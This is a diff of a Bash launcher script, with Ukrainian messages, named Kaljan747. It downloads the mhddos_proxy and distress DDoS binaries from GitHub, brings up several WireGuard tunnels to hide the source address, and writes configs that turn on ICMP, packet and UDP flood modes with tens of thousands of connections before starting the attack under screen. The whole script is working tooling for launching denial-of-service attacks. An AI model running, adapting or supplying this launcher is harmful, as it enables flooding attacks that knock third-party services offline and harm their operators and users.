@@ -1,7 +1,8 @@
 #!/bin/bash
+
 set -e
 
-# === Кольорові функції ===
+
 print_header() {
     echo -e "\e[1;36m========================================"
     echo -e "🚀  Запуск Kaljan747"
@@ -14,70 +15,18 @@ print_summary() {
     echo -e "🌍  Завантаження WG-конфігів: \e[1;32mOK\e[0m"
     echo -e "⚙️  Запуск модуля: PID $1"
     echo -e "----------------------------------------\e[0m"
+
+    echo -e "\n📨  Email-звіт буде надсилатись кожні 4 год. на \e[1;35muser@example.com\e[0m"
 }
 
 print_stage() {
     echo -e "\e[1;34m$1\e[0m"
 }
 
+
 SETTINGS_FILE="$HOME/.kaljan747_settings"
-LOG_DIR="$HOME/logs"
-LOG_FILE="$LOG_DIR/wg.log"
-MODULE_DIR="$HOME/modules"
-WG_DIR="$HOME/wg_confs"
 
-mkdir -p "$LOG_DIR" "$MODULE_DIR" "$WG_DIR"
-touch "$LOG_FILE"
-
-# === Встановлення прав доступу ===
-set_permissions() {
-    echo -e "\n📁  Встановлюю права доступу до папок і файлів..."
-
-    sudo mkdir -p "$MODULE_DIR" "$WG_DIR"
-
-    if [ -f "$MODULE_DIR/mhddos_proxy" ]; then
-        sudo chmod +x "$MODULE_DIR/mhddos_proxy"
-    else
-        echo "[-] Файл mhddos_proxy не знайдено!"
-    fi
-
-    if [ -f "$MODULE_DIR/distress" ]; then
-        sudo chmod +x "$MODULE_DIR/distress"
-    else
-        echo "[-] Файл distress не знайдено!"
-    fi
-
-    sudo chmod 644 "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"
-    sudo chown -R "$USER:$USER" "$HOME"
-    sudo chmod -R 755 "$LOG_DIR"
-    sudo chmod 644 "$LOG_FILE"
-    echo -e "✅ Права доступу встановлено."
-}
-
-download_wg_configs() {
-    echo -e "\n📥 Завантаження WG-конфігів..."
-    WG_REPO_URL="https://github.com/k7771/Kaljan747/tree/k7771/wg"
-    CONF_LIST=$(curl -fsSL "$WG_REPO_URL" | grep -oP '(?<=href=").*?\.conf(?=")' | sed -e 's|^/|https://raw.githubusercontent.com/|' -e 's|blob/|raw/|')
-    if [ -z "$CONF_LIST" ]; then
-        echo "[-] Не вдалося знайти конфігураційні файли за вказаним URL."
-        exit 1
-    fi
-    for url in $CONF_LIST; do
-        file=$(basename "$url")
-        wget -qO "$WG_DIR/$file" "$url" || { echo "[-] Не вдалося завантажити $file"; exit 1; }
-    done
-}
-
-install_dependencies() {
-    if command -v apt >/dev/null 2>&1; then
-        sudo apt update -y
-        sudo apt install -y curl wget git screen sed wireguard zenity
-    else
-        echo "Підтримуваний пакетний менеджер не знайдено."
-        exit 1
-    fi
-}
-
+# === Функція запиту USER-ID ===
 ask_user_id() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
@@ -86,6 +35,7 @@ ask_user_id() {
     fi
 }
 
+# === Функція запиту параметрів запуску ===
 ask_run_parameters() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
@@ -122,24 +72,49 @@ ask_run_parameters() {
     fi
 }
 
-# === Встановлення обох модулів ===
-MHDDOS_BIN="$MODULE_DIR/mhddos_proxy"
-DISTRESS_BIN="$MODULE_DIR/distress"
+# === Завантаження або запит налаштувань ===
+if [ -f "$SETTINGS_FILE" ]; then
+    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
+        zenity --question --title="Налаштування" --text="Використати збережені налаштування?" --ok-label="Так" --cancel-label="Ні"
+        USE_OLD=$?
+    else
+        echo "Знайдено збережені налаштування:"
+        echo "1) Використати старі"
+        echo "2) Ввести нові"
+        read -p "Ваш вибір (1/2): " choice
+        if [ "$choice" = "1" ]; then
+            USE_OLD=0
+        else
+            USE_OLD=1
+        fi
+    fi
 
-[ -f "$MHDDOS_BIN" ] || wget -qO "$MHDDOS_BIN" "https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
-chmod +x "$MHDDOS_BIN"
-
-[ -f "$DISTRESS_BIN" ] || wget -qO "$DISTRESS_BIN" "https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
-chmod +x "$DISTRESS_BIN"
-
-# === Завантаження/ввід параметрів ===
-if [ -f "$SETTINGS_FILE" ]; then source "$SETTINGS_FILE"; fi
+    if [ "$USE_OLD" -eq 0 ]; then
+        source "$SETTINGS_FILE"
+    else
+        USER_ID=""
+        SELECTED_MODULE=""
+        EDIT_INI=""
+        SELECTED_RUN_MODE=""
+    fi
+fi
 
 if [ -z "$USER_ID" ]; then
     while true; do
         ask_user_id
-        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break
-        echo "USER-ID має містити лише цифри!"
+        if [ -z "$USER_ID" ]; then
+            echo "User-id обов'язковий. Завершення."
+            exit 1
+        fi
+        if [[ "$USER_ID" =~ ^[0-9]+$ ]]; then
+            break
+        else
+            if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
+                zenity --error --text="Помилка: USER-ID має містити тільки цифри!" --width=400
+            else
+                echo "Помилка: USER-ID має містити тільки цифри!"
+            fi
+        fi
     done
 fi
 
@@ -147,73 +122,109 @@ if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" 
     ask_run_parameters
 fi
 
-# === FIX: очистка пробілів у SELECTED_MODULE ===
-SELECTED_MODULE=$(echo "$SELECTED_MODULE" | xargs)
+print_header
+echo -e "📥  Отримано USER-ID: \e[1;32m$USER_ID\e[0m"
+echo -e "🧩  Обраний модуль: \e[1;36m$SELECTED_MODULE\e[0m"
+echo -e "🛠️  Режим запуску: \e[1;36m$SELECTED_RUN_MODE\e[0m"
 
-# === Встановлення прав доступу ===
-set_permissions
 
-# === Завантаження конфігів ===
-download_wg_configs
+# === Збереження налаштувань у файл ===
+cat > "$SETTINGS_FILE" <<EOF
+USER_ID="$USER_ID"
+SELECTED_MODULE="$SELECTED_MODULE"
+EDIT_INI="$EDIT_INI"
+SELECTED_RUN_MODE="$SELECTED_RUN_MODE"
+EOF
 
-# === Встановлення залежностей ===
-install_dependencies
+# === Перевірка прав користувача ===
+if [ "$(id -u)" -eq 0 ]; then
+    SUDO=""
+else
+    if command -v sudo >/dev/null 2>&1; then
+        SUDO="sudo"
+    else
+        echo "sudo не знайдено. Встановіть або увійдіть як root."
+        exit 1
+    fi
+fi
 
-# === Зупинка всіх WG ===
-for iface in $(wg show interfaces 2>/dev/null); do
-    sudo wg-quick down "$iface" 2>/dev/null || true
-    sudo ip link delete "$iface" 2>/dev/null || true
+# === Встановлення необхідних пакетів ===
+if command -v apt >/dev/null 2>&1; then
+    $SUDO apt update -y
+    $SUDO apt install -y curl wget git screen sed wireguard zenity
+elif command -v dnf >/dev/null 2>&1; then
+    $SUDO dnf install -y curl wget git screen sed wireguard-tools zenity
+elif command -v yum >/dev/null 2>&1; then
+    $SUDO yum install -y curl wget git screen sed wireguard-tools zenity
+elif command -v apk >/dev/null 2>&1; then
+    $SUDO apk add curl wget git screen sed wireguard-tools zenity
+else
+    echo "Підтримуваний пакетний менеджер не знайдено."
+    exit 1
+fi
+
+# === Підготовка директорій ===
+MODULE_DIR="$HOME/modules"
+WG_DIR="$HOME/wg_confs"
+mkdir -p "$MODULE_DIR" "$WG_DIR"
+touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"
+
+# === Вибір модуля ===
+case "$SELECTED_MODULE" in
+    mhddos_proxy)
+        MODULE="$MODULE_DIR/mhddos_proxy"
+        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
+        MODULE_NAME="mhddos"
+        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
+        ;;
+    distress)
+        MODULE="$MODULE_DIR/distress"
+        CONFIG_FILE="$MODULE_DIR/distress.ini"
+        MODULE_NAME="distress"
+        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
+        ;;
+esac
+
+[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
+chmod +x "$MODULE"
+
+# === Завантаження WG-конфігів ===
+WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
+WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
+CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
+
+for url in $CONF_LIST; do
+    file=$(basename "$url")
+    wget -qO "$WG_DIR/$file" "$url"
 done
 
-# === Підключення до 4-х WG тунелів ===
-WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
-WG_IFACES=()
-INDEX=0
+$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
 
-while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
-    conf="${WG_FILES[$INDEX]}"
+# === Зупинка активних WG ===
+for iface in $(wg show interfaces 2>/dev/null); do
+    $SUDO wg-quick down "$iface" || true
+    $SUDO ip link delete "$iface" || true
+done
+
+# === Підключення нових WG ===
+WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 10))
+WG_IFACES=()
+for conf in "${WG_FILES[@]}"; do
     IFACE_NAME=$(basename "$conf" .conf)
-    sudo wg-quick up "$conf" 2>/dev/null || true
-    sleep 2
-    if curl -s --interface "$IFACE_NAME" --max-time 5 https://api.ipify.org >/dev/null 2>&1; then
-        echo -e "✅ Інтерфейс $IFACE_NAME працює."
-        echo "$(date '+%Y-%m-%d %H:%M:%S') ✅ $IFACE_NAME працює." >> "$LOG_FILE"
-        WG_IFACES+=("$IFACE_NAME")
-    else
-        echo -e "❌ $IFACE_NAME не працює. Відключаю."
-        echo "$(date '+%Y-%m-%d %H:%M:%S') ❌ $IFACE_NAME не працює." >> "$LOG_FILE"
-        sudo wg-quick down "$IFACE_NAME" 2>/dev/null || true
-        sudo ip link delete "$IFACE_NAME" 2>/dev/null || true
-    fi
-    INDEX=$((INDEX+1))
+    $SUDO wg-quick up "$conf"
+    WG_IFACES+=("$IFACE_NAME")
+    sleep 1
 done
 
 VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
 VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
 
-# === Генерація ini файлів ===
+echo -e "📡  VPN-інтерфейси: \e[1;36m$VPN_LIST\e[0m"
+
+# === Оновлення ini файлів ===
 echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
 echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
 
-# === Вибір модуля ===
-case "$SELECTED_MODULE" in
-    mhddos_proxy)
-        MODULE="$MHDDOS_BIN"
-        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
-        MODULE_NAME="mhddos"
-        ;;
-    distress)
-        MODULE="$DISTRESS_BIN"
-        CONFIG_FILE="$MODULE_DIR/distress.ini"
-        MODULE_NAME="distress"
-        ;;
-    *)
-        echo "❌ Невідомий модуль: $SELECTED_MODULE"
-        exit 1
-        ;;
-esac
-
-# === Редагування INI ===
 if [ "$EDIT_INI" = "Так" ]; then
     if [ -n "$DISPLAY" ]; then
         zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
@@ -224,21 +235,10 @@ if [ "$EDIT_INI" = "Так" ]; then
 fi
 
 # === Запуск модуля ===
-echo -e "⚙️  Запускаю модуль..."
 case "$SELECTED_RUN_MODE" in
-    "screen у фоні") 
-        screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE")
-        PID=$(pgrep -f "$MODULE")
-        ;;
-    "screen відкрито") 
-        screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE")
-        PID=$(pgrep -f "$MODULE")
-        ;;
-    "без screen") 
-        "$MODULE" $(cat "$CONFIG_FILE") &
-        PID=$!
-        ;;
+    "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
+    "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
+    "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
 esac
 
-print_summary "$PID"
 exit 0
